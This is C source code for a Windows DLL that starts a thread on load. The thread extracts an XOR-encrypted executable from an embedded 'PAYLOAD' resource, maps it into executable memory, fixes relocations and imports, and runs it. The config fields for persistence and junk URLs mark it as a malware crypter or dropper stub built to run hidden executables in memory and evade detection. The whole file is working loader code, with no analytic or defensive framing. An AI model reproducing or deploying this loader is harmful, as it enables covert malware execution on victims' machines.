#include <windows.h>
#include <stdio.h>
#include <stdint.h>

void hex_to_bytes(const char *hex, unsigned char *bytes, size_t len) {
    for (size_t i = 0; i < len; i++) {
        sscanf(hex + 2 * i, "%2hhx", &bytes[i]);
    }
}

void apply_relocations(unsigned char *imageBase, PIMAGE_NT_HEADERS ntHeader, DWORD64 delta) {
    PIMAGE_BASE_RELOCATION relocation = (PIMAGE_BASE_RELOCATION)(imageBase + ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
    if (ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size == 0) {
        return;
    }
    while (relocation->VirtualAddress) {
        DWORD numRelocs = (relocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
        WORD *relocData = (WORD *)(relocation + 1);
        for (DWORD i = 0; i < numRelocs; i++) {
            int type = relocData[i] >> 12;
            int offset = relocData[i] & 0xFFF;
            if (type == IMAGE_REL_BASED_DIR64) {
                DWORD64 *address = (DWORD64 *)(imageBase + relocation->VirtualAddress + offset);
                *address += delta;
            }
        }
        relocation = (PIMAGE_BASE_RELOCATION)((BYTE *)relocation + relocation->SizeOfBlock);
    }
}

void resolve_imports(unsigned char *imageBase, PIMAGE_NT_HEADERS ntHeader) {
    PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)(imageBase + ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
    if (ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size == 0) {
        return;
    }
    while (importDesc->Name) {
        LPCSTR dllName = (LPCSTR)(imageBase + importDesc->Name);
        HMODULE hDll = LoadLibraryA(dllName);
        if (!hDll) {
            return;
        }
        PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)(imageBase + importDesc->FirstThunk);
        while (thunk->u1.AddressOfData) {
            if (thunk->u1.Ordinal & IMAGE_ORDINAL_FLAG) {
                thunk->u1.Function = (ULONGLONG)GetProcAddress(hDll, (LPCSTR)(thunk->u1.Ordinal & 0xFFFF));
            } else {
                PIMAGE_IMPORT_BY_NAME importByName = (PIMAGE_IMPORT_BY_NAME)(imageBase + thunk->u1.AddressOfData);
                thunk->u1.Function = (ULONGLONG)GetProcAddress(hDll, importByName->Name);
            }
            if (!thunk->u1.Function) {
                return;
            }
            thunk++;
        }
        importDesc++;
    }
}

HMODULE g_hModule = NULL;

DWORD WINAPI ExecutePayloadThread(LPVOID lpParam) {
    HRSRC hRes = FindResource(g_hModule, "CONFIG", "PAYLOAD");
    if (!hRes) {
        return 1;
    }

    HGLOBAL hGlobal = LoadResource(g_hModule, hRes);
    if (!hGlobal) {
        return 1;
    }

    void *config_data = LockResource(hGlobal);
    if (!config_data) {
        return 1;
    }

    DWORD config_size = SizeofResource(g_hModule, hRes);
    if (config_size == 0) {
        return 1;
    }

    // Parse the PayloadConfig structure
    typedef struct {
        char key_hex[65];           // 64 chars + null terminator
        unsigned char persistence;  // 1 byte
        uint32_t junk_url_count;    // 4 bytes
        uint64_t payload_size;      // 8 bytes
        unsigned char load_in_memory; // 1 byte
        unsigned char payload_data[1]; // Variable length
    } PayloadConfig;
    PayloadConfig *config = (PayloadConfig *)config_data;
    char *key_hex = config->key_hex;
    uint64_t payload_size = config->payload_size;
    unsigned char *encrypted_payload = config->payload_data;

    // Convert key_hex to bytes
    unsigned char key[32];
    hex_to_bytes(key_hex, key, 32);

    // Decrypt the payload
    unsigned char *decrypted_payload = malloc(payload_size);
    if (!decrypted_payload) {
        return 1;
    }
    memcpy(decrypted_payload, encrypted_payload, payload_size);
    for (uint64_t i = 0; i < payload_size; i++) {
        decrypted_payload[i] ^= key[i % 32];
    }

    // Allocate memory for the EXE image
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)decrypted_payload;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        free(decrypted_payload);
        return 1;
    }
    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((BYTE *)decrypted_payload + dosHeader->e_lfanew);
    if (ntHeader->Signature != IMAGE_NT_SIGNATURE) {
        free(decrypted_payload);
        return 1;
    }
    SIZE_T image_size = ntHeader->OptionalHeader.SizeOfImage;

    LPVOID imageBase = VirtualAlloc(NULL, image_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!imageBase) {
        free(decrypted_payload);
        return 1;
    }

    // Copy headers
    memcpy(imageBase, decrypted_payload, ntHeader->OptionalHeader.SizeOfHeaders);

    // Copy sections
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeader);
    for (DWORD i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) {
        if (section[i].SizeOfRawData) {
            memcpy((BYTE *)imageBase + section[i].VirtualAddress, (BYTE *)decrypted_payload + section[i].PointerToRawData, section[i].SizeOfRawData);
        }
    }

    // Apply relocations
    DWORD64 delta = (DWORD64)imageBase - ntHeader->OptionalHeader.ImageBase;
    if (delta != 0) {
        apply_relocations((unsigned char *)imageBase, ntHeader, delta);
    }

    // Resolve imports
    resolve_imports((unsigned char *)imageBase, ntHeader);

    // Execute the payload
    typedef int (WINAPI *WinMain_t)(HINSTANCE, HINSTANCE, LPSTR, int);
    WinMain_t entryPoint = (WinMain_t)((DWORD64)imageBase + ntHeader->OptionalHeader.AddressOfEntryPoint);
    int result = entryPoint(NULL, NULL, NULL, 10); // SW_SHOW

    // Clean up
    VirtualFree(imageBase, 0, MEM_RELEASE);
    free(decrypted_payload);

    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
            g_hModule = hModule; // Store the module handle for resource loading
            CreateThread(NULL, 0, ExecutePayloadThread, NULL, 0, NULL);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}